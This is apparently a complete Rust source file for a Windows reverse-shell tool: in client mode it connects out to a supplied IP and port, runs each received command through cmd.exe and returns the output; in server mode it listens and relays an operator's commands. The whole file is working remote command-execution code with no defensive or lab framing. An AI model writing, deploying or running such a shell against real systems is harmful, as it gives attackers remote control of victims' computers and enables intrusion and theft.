use std::env;
use std::io::{self, BufRead, BufReader, Read, Write};
use std::net::{Ipv4Addr, Shutdown, SocketAddrV4, TcpListener, TcpStream};
use std::process::{Command, Output, exit};

fn start_client(ip: &String, port: u16) {
    let ip = match ip.parse::<Ipv4Addr>() {
        Ok(ip) => ip,
        Err(e) => {
            println!("Error: {}", e);
            exit(-1);
        }
    };
    let addr = SocketAddrV4::new(ip, port);
    let mut client = TcpStream::connect(addr).unwrap();
    println!("[+] Connected to {}", client.peer_addr().unwrap());

    loop {
        let mut buffer: Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&client);
        reader.read_until(b'\0', &mut buffer);

        if buffer.len() == 0
            || String::from_utf8_lossy(&buffer)
                .trim_end_matches('\0')
                .contains("exit")
        {
            break;
        }

        let mut output = execute_cmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));
        output.push('\0');
        client.write(&output.as_bytes());
    }

    client.shutdown(Shutdown::Both);
}

fn execute_cmd(cmd: &str) -> String {
    println!("[*] Executing: {}", cmd);
    let output: Output = Command::new("cmd.exe").args(&["/C", cmd]).output().unwrap();
    // String::from_utf8_lossy(&output.stdout).to_string()
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    if output.status.success() {
        stdout
    } else {
        stderr
    }
}

fn start_server(ip: &String, port: u16) {
    let ip = match ip.parse::<Ipv4Addr>() {
        Ok(ip) => ip,
        Err(e) => {
            println!("Error: {}", e);
            exit(-1);
        }
    };

    let cs = SocketAddrV4::new(ip, port);

    let listner = match TcpListener::bind(cs) {
        Ok(listner) => listner,
        Err(e) => {
            println!("Error: {}", e);
            exit(-1);
        }
    };

    let (mut clientsocket, clientaddr) = listner.accept().unwrap();
    println!("[+] Recieved Connection from {:?}", clientaddr);

    loop {
        // print!("{}", ":> ".red().bold());
        print!(":> ");
        io::stdout().flush().unwrap();
        let mut input = String::new();
        io::stdin().read_line(&mut input).expect("Command Expected");
        input.push('\0');

        if input.contains("exit") {
            break;
        }
        // else if input.contains("clear") || input.contains("cls") {
        //     clearscreen::clear().expect("Failed to clear screen");
        //     continue;
        // }

        clientsocket.write(&mut input.as_bytes());

        let mut buffer: Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&clientsocket);
        reader.read_until(b'\0', &mut buffer);

        let output = String::from_utf8_lossy(&buffer)
            .trim_end_matches(['\r', '\n', '\0'])
            .to_string();
        println!("{}", output);
    }

    clientsocket.shutdown(Shutdown::Both);
}

fn print_help(args: Vec<String>) {
    println!("[+] Usage:");
    println!("      {} client <ip> <port>", args[0]);
    println!("      {} server <ip> <port>", args[0]);
}

fn main() {
    let args: Vec<String> = env::args().collect();

    match args.get(1).map(|x| x.as_str()) {
        Some("client") => {
            if args.len() <= 3 {
                print_help(args);
            } else {
                let ip = args.get(2).unwrap();
                let port = args.get(3).unwrap().parse::<u16>().unwrap();
                start_client(ip, port);
            }
        }
        Some("server") => {
            if args.len() <= 3 {
                print_help(args);
            } else {
                let ip = args.get(2).unwrap();
                let port = args.get(3).unwrap().parse::<u16>().unwrap();
                start_server(ip, port);
            }
        }
        _ => print_help(args),
    };
}
